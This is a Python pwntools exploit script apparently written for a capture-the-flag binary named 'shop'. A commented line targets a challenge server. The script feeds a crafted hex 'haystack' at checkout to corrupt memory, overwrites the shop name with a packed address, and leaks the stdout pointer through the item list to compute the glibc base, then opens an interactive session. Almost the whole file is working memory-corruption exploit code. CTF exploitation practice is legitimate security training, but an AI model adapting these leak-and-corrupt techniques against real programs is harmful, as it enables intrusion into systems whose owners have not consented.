#!/usr/bin/env python

from pwn import *
import itertools
import random
import os

def generate_haystack():
    letters = '0123456789abcdef'
    array = [tuple(letters)] * 4
    tokens = set([''.join(e) for e in itertools.product(*array)])

    haystack = ''

    while len(tokens) > 0:
        found_t = False

        for i in range(3, -1, -1):
            array = [tuple(letters)] * (4 - i)
            tails = [''.join(e) for e in itertools.product(*array)]
            random.shuffle(tails)

            for ta in tails:
                newt = haystack[len(haystack)-i:] + ta

                if newt in tokens:
                    tokens.remove(newt)

                    if newt not in haystack:
                        haystack += ta

                    found_t = True
                    break

            if found_t:
                break

    return haystack

def checkout():
    if not os.path.exists('haystack.txt'):
        haystack = generate_haystack()

        with open('haystack.txt', 'w') as f:
            print >> f, haystack
    else:
        with open('haystack.txt', 'r') as f:
            haystack = f.read().strip()

    p.sendline('c')
    p.sendline(haystack[0:65538])

def get_shop_name(name):
    p.recvuntil('Enter your shop name:')
    p.sendline(name)
    p.recvuntil('> ')

def change_shop_name(name):
    p.sendline('n')
    get_shop_name(name)

def print_items():
    p.sendline('l')
    data = p.recvuntil('> ')
    return u64(data.split('\n')[-2].split(': $')[0] + '\00\00')

def add_item(name1, name2, price):
    p.sendline('a')
    p.sendline(name1)
    p.sendline(name2)
    p.sendline(str(price))

#p = remote('shop.chal.pwning.xxx', 9916)
p = process('./shop')

get_shop_name('aaaaaaaa')

for i in range(33):
    add_item(str(i), str(i), 10)

checkout()

change_shop_name(p64(0x6020b4) + '\00' * 4 + 'x' * 290)

stdout_addr = print_items()
print 'stdout address: {}'.format(hex(stdout_addr))

libc_base = stdout_addr - 0x3db720
print 'glibc base: {}'.format(hex(libc_base))

#gdb.attach(p)

p.interactive()

